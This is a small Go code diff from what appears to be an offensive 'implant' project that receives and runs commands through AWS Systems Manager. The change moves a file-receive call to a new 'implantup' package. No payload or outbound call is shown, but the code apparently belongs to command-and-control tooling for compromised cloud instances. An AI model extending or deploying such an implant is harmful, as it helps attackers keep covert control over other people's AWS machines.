@@ -9,6 +9,7 @@ import (
 	"github.com/aws/amazon-ssm-agent/agent/jsonutil"
 	"github.com/grines/ssmmm/awsssm"
 	"github.com/grines/ssmmm/implant/implantrun"
+	"github.com/grines/ssmmm/implant/implantup"
 	"github.com/grines/ssmmm/implant/implantutil"
 )
 
@@ -40,7 +41,7 @@ func main() {
 			cmdid := payload.CommandID
 			if payload.OutputS3KeyPrefix != "" {
 				awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
-				implantutil.RecieveFile(payload)
+				implantup.RecieveFile(payload)
 
 			} else {
 				for _, c := range payload.Parameters {
